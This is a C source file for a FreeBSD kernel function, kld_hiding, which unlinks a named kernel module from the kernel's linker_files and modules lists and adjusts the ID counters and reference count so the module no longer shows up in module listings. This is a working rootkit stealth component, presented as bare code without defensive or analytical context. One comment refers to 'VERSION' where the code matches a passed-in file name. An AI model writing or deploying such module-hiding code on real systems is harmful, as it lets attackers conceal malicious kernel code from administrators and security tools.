#include "kld_hiding.h"

/* The function called at load/unload. */
void kld_hiding(struct module *module, char *kld_file_name, char *kld_name)
{
   struct linker_file *lf;
   struct module *mod;
   mtx_lock(&Giant);

   /* Decrement the current kernel image's reference count. */
   (&linker_files)->tqh_first->refs--;

   /*
    * Iterate through the linker_files list, looking for VERSION.
    * If found, decrement next_file_id and remove from list.
    */
   TAILQ_FOREACH(lf, &linker_files, link) {
      if (strcmp(lf->filename, kld_file_name) == 0) {
         next_file_id--;
         TAILQ_REMOVE(&linker_files, lf, link);
         break;
      }
   }

   /*
    * Iterate through the modules list, looking for kld_name.
    * If found, decrement nextid and remove from list.
    */
   TAILQ_FOREACH(mod, &modules, link) {
      if (strcmp(mod->name, kld_name) == 0) {
         nextid--;
         TAILQ_REMOVE(&modules, mod, link);
         break;
      }
   }

   mtx_unlock(&Giant);
}
